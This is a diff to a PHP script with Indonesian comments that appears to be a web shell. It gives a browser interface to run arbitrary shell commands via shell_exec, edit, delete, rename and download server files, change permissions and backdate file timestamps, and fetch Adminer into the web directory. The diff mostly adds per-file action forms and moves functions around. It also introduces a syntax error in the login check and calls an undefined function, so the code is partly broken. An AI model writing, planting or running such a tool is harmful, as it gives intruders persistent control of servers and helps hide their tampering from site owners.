@@ -20,7 +20,7 @@ if (isset($_POST['logout'])) {
     exit;
 }
 
-if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
+if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated'])) {
     // Tampilkan form login jika belum terautentikasi
     echo '
     <style>
@@ -98,8 +98,13 @@ function displaySystemInfo() {
 // Fungsi untuk memeriksa apakah file atau folder dalam kondisi root atau terkunci
 function is_root_or_locked($file) {
     $perms = fileperms($file);
-    return (($perms & 0x0100) === 0 && ($perms & 0x0080) === 0 && ($perms & 0x0040) === 0) || // Tidak ada izin untuk pemilik
-           (($perms & 0x0002) === 0 && ($perms & 0x0001) === 0); // Tidak ada izin untuk grup dan lainnya
+
+    // Cek apakah file atau folder tidak memiliki izin write untuk owner, group, dan others
+    if (($perms & 0x0002) == 0 && ($perms & 0x0010) == 0 && ($perms & 0x0080) == 0) {
+        return true;
+    }
+    // Cek apakah izin file adalah 0000, 0444, 0555, atau setara
+    return ($perms === 0 || $perms === 0444 || $perms === 0555 || ($perms & 0xC000) == 0xC000);
 }
 
 // Fungsi untuk memecah nama file panjang menjadi beberapa baris
@@ -135,7 +140,74 @@ function display_path_links($dir) {
             echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . format_filename($folder) . "/</a>";
             echo "<span class='ml-auto'>" . get_permissions($folderPath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($folderPath)) . "</span>";
+            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$folder')\">Ganti Nama</button>";
+            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$folder')\">Ubah Chmod</button>";
+            echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$folder')\">Ubah Tanggal</button>";
+            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$folder')\">Hapus</button>";
             echo "</div>";
+
+            // Form Rename
+            echo "<div id='rename-$folder' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ganti Nama</h4>
+                        <label for='destination'><b>Nama Baru</b></label>
+                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
+                        <input type='hidden' name='source' value='$encodedPath'>
+                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$folder')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Form Chmod
+            echo "<div id='chmod-$folder' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ubah Chmod</h4>
+                        <div class='form-group'>
+                            <label for='chmodMode-$folder'>Pilih Mode</label>
+                            <select id='chmodMode-$folder' name='chmodMode' onchange=\"toggleChmodInput('$folder')\">
+                                <option value=''>Pilih Mode Chmod</option>
+                                <option value='biasa'>Biasa</option>
+                                <option value='manual'>Manual</option>
+                                <option value='copy'>chmod salin file/folder lain</option>
+                            </select>
+                        </div>
+                        <div class='form-group' id='chmodBiasa-$folder' style='display:none;'>
+                            <input type='text' id='mode-$folder' name='mode' placeholder='0755'>
+                        </div>
+                        <div class='form-group' id='chmodManual-$folder' style='display:none;'>
+                            <input type='text' id='chmodInput-$folder' name='manualChmod' placeholder='-rw-r--r--'>
+                        </div>
+                        <div class='form-group' id='chmodCopy-$folder' style='display:none;'>
+                            <input type='text' id='copyChmod-$folder' name='copyChmod' placeholder='Masukkan nama file'>
+                        </div>
+                        <input type='hidden' name='source' value='$encodedPath'>
+                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$folder')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Form Ubah Tanggal
+            echo "<div id='date-$folder' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ubah Tanggal</h4>
+                        <label for='newdate'><b>Tanggal Baru</b></label>
+                        <input type='datetime-local' name='newdate' required>
+                        <input type='hidden' name='source' value='$encodedPath'>
+                        <button type='submit' name='changedate' class='btn btn-primary'>Ubah Tanggal</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('date-$folder')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Delete Confirmation
+            echo "<div id='delete-$folder' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Hapus Folder</h4>
+                        <p>Apakah Anda yakin ingin menghapus folder ini?</p>
+                        <input type='hidden' name='path' value='$encodedPath'>
+                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$folder')\">Batal</button>
+                    </form>
+                </div>";
         }
 
         foreach ($files as $file) {
@@ -146,7 +218,87 @@ function display_path_links($dir) {
             echo "<span>" . format_filename($file) . "</span>";
             echo "<span class='ml-auto'>" . get_permissions($filePath) . "</span>";
             echo "<span class='ml-2'>" . date("Y-m-d H:i:s", filemtime($filePath)) . "</span>";
+            echo "<button class='btn btn-warning btn-sm ml-2' onclick=\"showForm('rename-$file')\">Ganti Nama</button>";
+            echo "<button class='btn btn-secondary btn-sm ml-2' onclick=\"showForm('chmod-$file')\">Ubah Chmod</button>";
+            echo "<button class='btn btn-info btn-sm ml-2' onclick=\"showForm('date-$file')\">Ubah Tanggal</button>";
+            echo "<button class='btn btn-primary btn-sm ml-2' onclick=\"showForm('edit-$file')\">Edit</button>";
+            echo "<button class='btn btn-danger btn-sm ml-2' onclick=\"showForm('delete-$file')\">Hapus</button>";
+            echo "<a href='?download=$encodedPath' class='btn btn-info btn-sm ml-2'>Download</a>";
             echo "</div>";
+
+            // Form Rename
+            echo "<div id='rename-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ganti Nama</h4>
+                        <label for='destination'><b>Nama Baru</b></label>
+                        <input type='text' placeholder='Masukkan nama baru' name='destination' required>
+                        <input type='hidden' name='source' value='$encodedPath'>
+                        <button type='submit' name='rename' class='btn btn-primary'>Ganti Nama</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('rename-$file')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Form Chmod
+            echo "<div id='chmod-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ubah Chmod</h4>
+                        <div class='form-group'>
+                            <label for='chmodMode-$file'>Pilih Mode</label>
+                            <select id='chmodMode-$file' name='chmodMode' onchange=\"toggleChmodInput('$file')\">
+                                <option value=''>Pilih Mode Chmod</option>
+                                <option value='biasa'>Biasa</option>
+                                <option value='manual'>Manual</option>
+                                <option value='copy'>chmod salin file/folder lain</option>
+                            </select>
+                        </div>
+                        <div class='form-group' id='chmodBiasa-$file' style='display:none;'>
+                            <input type='text' id='mode-$file' name='mode' placeholder='0755'>
+                        </div>
+                        <div class='form-group' id='chmodManual-$file' style='display:none;'>
+                            <input type='text' id='chmodInput-$file' name='manualChmod' placeholder='-rw-r--r--'>
+                        </div>
+                        <div class='form-group' id='chmodCopy-$file' style='display:none;'>
+                            <input type='text' id='copyChmod-$file' name='copyChmod' placeholder='Masukkan nama file'>
+                        </div>
+                        <input type='hidden' name='source' value='$encodedPath'>
+                        <button type='submit' name='chmod' class='btn btn-primary'>Ubah Chmod</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('chmod-$file')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Form Ubah Tanggal
+            echo "<div id='date-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Ubah Tanggal</h4>
+                        <label for='newdate'><b>Tanggal Baru</b></label>
+                        <input type='datetime-local' name='newdate' required>
+                        <input type='hidden' name='source' value='$encodedPath'>
+                        <button type='submit' name='changedate' class='btn btn-primary'>Ubah Tanggal</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('date-$file')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Form Edit
+            echo "<div id='edit-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Edit File</h4>
+                        <textarea name='content' rows='10' class='form-control'>" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
+                        <input type='hidden' name='editSource' value='$encodedPath'>
+                        <button type='submit' name='saveEdit' class='btn btn-primary'>Simpan</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('edit-$file')\">Batal</button>
+                    </form>
+                </div>";
+
+            // Delete Confirmation
+            echo "<div id='delete-$file' class='form-popup'>
+                    <form method='post' class='form-container'>
+                        <h4>Hapus File</h4>
+                        <p>Apakah Anda yakin ingin menghapus file ini?</p>
+                        <input type='hidden' name='path' value='$encodedPath'>
+                        <button type='submit' name='delete' class='btn btn-danger'>Hapus</button>
+                        <button type='button' class='btn btn-secondary' onclick=\"hideForm('delete-$file')\">Batal</button>
+                    </form>
+                </div>";
         }
     } else {
         echo "<div class='alert alert-danger'>Direktori tidak ditemukan.</div>";
@@ -183,6 +335,88 @@ function str2oct($str) {
     }
 
     return octdec(implode('', $oct));
+}
+
+// Fungsi untuk menghapus item
+function deleteItem($path) {
+    $path = base64_decode(urldecode($path));
+    if (is_dir($path)) {
+        if (@rmdir($path)) {
+            echo "<div class='alert alert-success'>Direktori berhasil dihapus.</div>";
+        } else {
+            echo "<div class='alert alert-danger'>Gagal menghapus direktori.</div>";
+        }
+    } else {
+        if (@unlink($path)) {
+            echo "<div class='alert alert-success'>File berhasil dihapus.</div>";
+        } else {
+            echo "<div class='alert alert-danger'>Gagal menghapus file.</div>";
+        }
+    }
+}
+
+// Fungsi untuk rename file/folder
+function renameFile($source, $destination) {
+    $source = base64_decode(urldecode($source));
+    if (@rename($source, $destination)) {
+        echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
+    }
+}
+
+// Fungsi untuk mengubah chmod
+function changePermissions($path, $mode, $copyFrom = null, $manual = false) {
+    $path = base64_decode(urldecode($path));
+    if ($copyFrom) {
+        $copyFrom = realpath($copyFrom);
+        if ($copyFrom && file_exists($copyFrom)) {
+            $mode = @fileperms($copyFrom) & 0777; // Ambil izin chmod dari file lain
+        } else {
+            echo "<div class='alert alert-danger'>File sumber chmod tidak ditemukan.</div>";
+            return;
+        }
+    } elseif ($manual) {
+        $mode = str2oct($mode); // Konversi dari format string ke oktal
+    } else {
+        $mode = octdec($mode);
+    }
+
+    if (@chmod($path, $mode)) {
+        echo "<div class='alert alert-success'>Chmod berhasil diubah.</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Gagal mengubah chmod.</div>";
+    }
+}
+
+// Fungsi untuk mengubah tanggal modifikasi file
+function changeDate($path, $newdate) {
+    $path = base64_decode(urldecode($path));
+    changeFileDate($path, $newdate);
+}
+
+// Fungsi untuk mengedit file
+function editFile($path, $content) {
+    $path = base64_decode(urldecode($path));
+    if (@file_put_contents($path, $content) !== false) {
+        echo "<div class='alert alert-success'>File berhasil diedit.</div>";
+    } else {
+        echo "<div class='alert alert-danger'>Gagal mengedit file.</div>";
+    }
+}
+
+// Fungsi untuk menjalankan perintah terminal
+function executeCommand($command, $dir) {
+    chdir($dir);
+    $output = @shell_exec($command);
+    return htmlspecialchars($output);
+}
+
+// Fungsi untuk meng-upload Adminer
+function uploadAdminer($filename, $dir) {
+    $url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";
+    $saveTo = rtrim($dir, '/') . '/' . $filename . '.php';
+    uploadFromUrl($url, $saveTo);
 }
 
 // Proses permintaan yang diterima
@@ -267,93 +501,6 @@ if (isset($_GET['download'])) {
     }
 }
 
-// Fungsi untuk mengubah tanggal modifikasi file
-function changeDate($path, $newdate) {
-    $path = base64_decode(urldecode($path));
-    $timestamp = strtotime($newdate);
-    if (touch($path, $timestamp)) {
-        echo "<div class='alert alert-success'>Tanggal berhasil diubah.</div>";
-    } else {
-        echo "<div class='alert alert-danger'>Gagal mengubah tanggal.</div>";
-    }
-}
-
-// Fungsi untuk menghapus item
-function deleteItem($path) {
-    $path = base64_decode(urldecode($path));
-    if (is_dir($path)) {
-        if (@rmdir($path)) {
-            echo "<div class='alert alert-success'>Direktori berhasil dihapus.</div>";
-        } else {
-            echo "<div class='alert alert-danger'>Gagal menghapus direktori.</div>";
-        }
-    } else {
-        if (@unlink($path)) {
-            echo "<div class='alert alert-success'>File berhasil dihapus.</div>";
-        } else {
-            echo "<div class='alert alert-danger'>Gagal menghapus file.</div>";
-        }
-    }
-}
-
-// Fungsi untuk rename file/folder
-function renameFile($source, $destination) {
-    $source = base64_decode(urldecode($source));
-    if (@rename($source, $destination)) {
-        echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
-    } else {
-        echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
-    }
-}
-
-// Fungsi untuk mengubah chmod
-function changePermissions($path, $mode, $copyFrom = null, $manual = false) {
-    $path = base64_decode(urldecode($path));
-    if ($copyFrom) {
-        $copyFrom = realpath($copyFrom);
-        if ($copyFrom && file_exists($copyFrom)) {
-            $mode = @fileperms($copyFrom) & 0777; // Ambil izin chmod dari file lain
-        } else {
-            echo "<div class='alert alert-danger'>File sumber chmod tidak ditemukan.</div>";
-            return;
-        }
-    } elseif ($manual) {
-        $mode = str2oct($mode); // Konversi dari format string ke oktal
-    } else {
-        $mode = octdec($mode);
-    }
-
-    if (@chmod($path, $mode)) {
-        echo "<div class='alert alert-success'>Chmod berhasil diubah.</div>";
-    } else {
-        echo "<div class='alert alert-danger'>Gagal mengubah chmod.</div>";
-    }
-}
-
-// Fungsi untuk mengedit file
-function editFile($path, $content) {
-    $path = base64_decode(urldecode($path));
-    if (@file_put_contents($path, $content) !== false) {
-        echo "<div class='alert alert-success'>File berhasil diedit.</div>";
-    } else {
-        echo "<div class='alert alert-danger'>Gagal mengedit file.</div>";
-    }
-}
-
-// Fungsi untuk menjalankan perintah terminal
-function executeCommand($command, $dir) {
-    chdir($dir);
-    $output = @shell_exec($command);
-    return htmlspecialchars($output);
-}
-
-// Fungsi untuk meng-upload Adminer
-function uploadAdminer($filename, $dir) {
-    $url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php";
-    $saveTo = rtrim($dir, '/') . '/' . $filename . '.php';
-    uploadFromUrl($url, $saveTo);
-}
-
 $dir = isset($_GET['dir']) ? base64_decode(urldecode($_GET['dir'])) : '.';
 $displayDir = realpath($dir);
 
@@ -417,7 +564,7 @@ $dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($va
         .form-container .btn:hover, .open-button:hover {
             opacity: 1;
         }
-
+        
         .info-sites, .network-info {
             display: none;
             margin-top: 20px;
